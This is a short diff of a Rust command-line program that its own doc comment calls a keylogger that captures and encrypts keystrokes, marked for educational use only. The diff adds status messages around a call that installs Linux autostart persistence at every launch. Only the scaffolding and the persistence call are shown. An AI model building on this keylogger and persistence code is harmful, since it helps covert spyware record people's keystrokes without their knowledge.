@@ -7,7 +7,7 @@ use std::io::{self, Write};
 
 use clap::{Parser, Subcommand};
 
-/// 🎯 Keylogger en Rust — à usage éducatif uniquement
+///  Keylogger en Rust — à usage éducatif uniquement
 #[derive(Parser)]
 #[command(name = "Keylogger")]
 #[command(about = "Capture et chiffre les frappes clavier", long_about = None)]
@@ -34,7 +34,9 @@ enum Commands {
 }
 
 fn main() {
+    println!("▶ Initialisation de l'autostart...");
     modules::persistence::setup_autostart_linux().expect("Autostart setup failed");
+    println!("▶ Autostart configuré.");
     let cli = Cli::parse();
 
     match &cli.command {
